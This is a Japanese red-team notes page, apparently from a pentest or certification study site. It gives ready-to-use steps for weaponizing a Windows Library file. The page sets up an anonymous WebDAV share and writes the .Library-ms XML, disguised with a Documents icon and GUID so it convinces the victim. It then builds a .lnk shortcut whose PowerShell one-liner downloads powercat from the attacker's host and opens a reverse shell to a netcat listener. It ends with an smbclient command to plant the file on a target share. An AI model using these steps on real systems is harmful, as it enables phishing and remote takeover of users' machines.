---
title: Windows Library FIle
parent: Weaponization
grand_parent: Red Team
---

# WebDAV共有を設定
```bash
# wsgidavのインストール
sudo apt update
sudo apt install python3-wsgidav

# 共有フォルダとファイルの準備
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt

# webdavサーバの起動
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

# ブラウザで確認
http://127.0.0.1
```

# ライブラリファイルの作成
（WIndows上で）Visual Studio Codeを起動し、「ファイル」 > 「新規テキストファイル」をクリックし、空のファイルを「config.Library-ms」名前でユーザーのデスクトップに保存。
※ 作成したファイルはアイコンの外観を変更を推奨
ライブラリファイルは3つの主要な部分で構成され,XMLで記述され、リモートロケーションへのアクセスパラメータを指定する。
- ライブラリの一般情報
- ライブラリのプロパティ
- ライブラリの場所
```bash
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference> # ドキュメントフォルダーのアイコンにはインデックス「-1002」、ピクチャフォルダーのアイコンにはインデックス「-1003」を使用
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> # 被害者にとってできるだけ説得力のあるように、Documents GUID を使用
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.204</url> 
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
ファイルを保存し、実行するとwebdavに接続される。
またコードも以下のように変わってしまう。
再起動などをすると使えなくなることがあるのでその場合は再度作成する。
```bash
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>8</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\192.168.45.204\DavWWWRoot</url> # 　<serialized>MBAAAEAFCAAAAAAAADAAAAAAAYkgCAQDQAAAAA4LuHSBWvdAA+i7hUg1bHAgv4eIFY92BAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA0EAAAAHAAAACAAAAAAAAAAAAAAAcAAAAwEAAAAMAAAACAAAAQBAAAAAAAAAAAgLAwFXxkjMuEjN44CN14iMwQDXEFkVXd1VS90TUBAA+DAAAwAAAAKFA8BWNoBLwHivQNEiwO3Z8b5788LAAAQuAs7rTuzqAQAAAAAAA0CAAAQMTB1UzNU5K47Qt+UhknG3GODmuFBAAAwCAAAAAsAAAAw//DAAAAAAA0EAAAQMTB1UwEfJ3++RaARpxLAYM656sGDAAAgCAAAAA8BAAAwDAAAAxAQOAIDAuAQMAYDA4AgLAQDA1AgLAIDAwAANAAAAAAAAAAAAtAAAAEzUQNlOk2r3zezgDF55Ehp2pU5qRAAAAMAAAAAATAAAAAAAAAAAAAAAAAAAAAAAhAwwAACXcFTOy4SM2gjL0UjLyADNcRUY2d1VXJ1bvRHAAAAFDAAABAAAgyFXxkjMuEjN44CN14iMwQDXEFmdXd1VS92b0BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcBAXAEDA5AgMA4CAxAgNAgDAuAANAUDAuAgMAADA0AAXAQEAhBgdAcFAXBwVAIFAvBwbAQHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</serialized>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```


# .lnkショートカットファイルの作成及びリバースシェルの取得
powercatをDLするためのWebサーバを起動
```bash
python3 -m http.server 8000
```

Netcatで待受を開始
```bash
rlwrap nc -nlvp 4444
```
### ※powercat.ps1のリポジトリ
```
https://github.com/besimorhino/powercat/tree/master
```
以下のリンクを含むショートカットを作成する
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.204:8000/powercat.ps1');powercat -c 192.168.45.204 -p 4444 -e powershell"
```
上記の.lnkファイルをターゲットに送信し、ユーザがリンクをクリックするとリバースシェルが貼られる。

# ファイルの送信方法の例
```bash
smbclient //192.168.214.195/share -c 'put config.Library-ms
```